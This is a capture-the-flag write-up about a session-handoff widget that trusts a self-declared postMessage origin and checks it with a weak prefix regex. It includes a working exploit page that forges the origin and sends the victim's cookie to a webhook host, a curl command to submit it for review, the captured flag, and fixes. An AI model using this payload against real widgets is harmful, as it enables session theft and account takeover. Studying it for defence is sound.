# Portway postMessage Origin Trust Session Leak

## What Is Happening

The [Portway lab](https://46fb2c180db4.pwnbox-lab.com/) offers a session-handoff widget that partner apps can use to receive a signed session token via `postMessage`. Users can also report a suspicious partner URL, and a reviewer opens that URL in a fresh authenticated session.

In practice, the handoff widget trusts an attacker-controlled `origin` field inside the message body. That lets a malicious partner page impersonate a trusted origin and receive the reviewer's session cookie.

## Why It Happens

The live widget at `/embed/handoff` contains:

```javascript
const ALLOWED = /^https?:\/\/[^.]+\.pwnbox\.io/;

window.addEventListener("message", (m) => {
  const origin = m.data && m.data.origin;
  if (typeof origin === "string" && ALLOWED.test(origin)) {
     const target = window.opener || window.parent;
     target.postMessage({ session: document.cookie }, origin);
  }
});
```

Two bugs combine:

1. It validates `m.data.origin`, not the browser-supplied `m.origin`.
2. The allowlist is only a prefix regex, so a value like:

```text
https://partner.pwnbox.io@httpbin.org
```

passes the regex but resolves to the real origin `https://httpbin.org` when used as `postMessage(..., origin)`.

## Exact Test

Use an attacker-controlled partner page that:

1. opens `/embed/handoff` in a popup
2. repeatedly sends a forged message:

```javascript
{ origin: 'https://partner.pwnbox.io@httpbin.org' }
```

3. listens for the reply and exfiltrates `e.data.session`

Minimal payload shape:

```javascript
window.addEventListener('message', function(e) {
  fetch('https://webhook.site/[uuid]?d=' + encodeURIComponent(JSON.stringify(e.data)));
});

var w = window.open('https://46fb2c180db4.pwnbox-lab.com/embed/handoff', 'pw');
setInterval(function() {
  try {
    w.postMessage({ origin: 'https://partner.pwnbox.io@httpbin.org' }, '*');
  } catch (e) {}
}, 500);
```

Report that partner URL:

```bash
curl -sS -X POST "https://46fb2c180db4.pwnbox-lab.com/report" \
  -d "url=https://httpbin.org/base64/[payload]"
```

## Expected Signal

- `/embed/handoff` responds with the inline widget code.
- An iframe self-test may only return an empty session because third-party cookies are missing.
- A popup self-test returns the real cookie when the message lands after the listener is installed.
- The reviewer-run exploit delivers a webhook callback containing the flag.

## Result Interpretation

Confirmed bug chain:

```text
attacker-controlled partner page
-> opens /embed/handoff in reviewer session
-> sends forged { origin: "https://partner.pwnbox.io@httpbin.org" }
-> regex accepts fake trusted prefix
-> postMessage targetOrigin resolves to attacker origin
-> widget posts document.cookie to attacker page
```

Webhook collector received:

```text
{"session":"flag=pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}"}
```

## Root Cause

The SDK uses attacker-controlled message data as the origin-of-truth and combines it with a weak regex allowlist on a raw string.

## Impact

- Leakage of the reviewer's Portway session cookie
- Full break of the session-handoff trust boundary
- In real systems, likely account takeover or SSO session theft across partner integrations

## Fix

- Validate `m.origin`, not `m.data.origin`
- Parse and compare exact trusted origins
- Reject userinfo and other parser-confusion forms
- Send narrow, signed handoff tokens rather than raw cookies
- Consider requiring a challenge-response handshake tied to the actual sender window and origin

## Key Lesson

`postMessage` already tells you who sent the message. If a widget instead trusts a self-declared `origin` field inside `event.data`, the attacker gets to define the trust boundary.

## Flag

`pwnbox{4a1c8e60d94f6b2fa7d0c8e51a6c9d4b}`
